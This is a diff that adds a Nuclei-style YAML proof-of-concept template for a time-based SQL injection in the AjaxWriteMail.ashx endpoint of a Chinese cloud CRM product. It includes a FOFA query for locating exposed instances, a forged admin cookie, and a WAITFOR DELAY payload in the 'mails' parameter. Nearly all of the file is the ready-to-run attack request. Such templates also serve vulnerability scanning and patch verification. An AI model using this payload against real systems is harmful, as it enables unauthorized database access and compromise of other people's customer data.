@@ -1,0 +1,28 @@
+id: poc-wgek8ys8w75bf3ot
+info:
+  name: 孚盟云CRM AjaxWriteMail.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgek8ys8w75bf3ot'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wgek8ys8w75bf3ot
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: UserCookie={"empId":"admin","corpId": "1"}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    method=updateLastedContactTable&mails=1''WAITFOR+DELAY+''0:0:5''--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
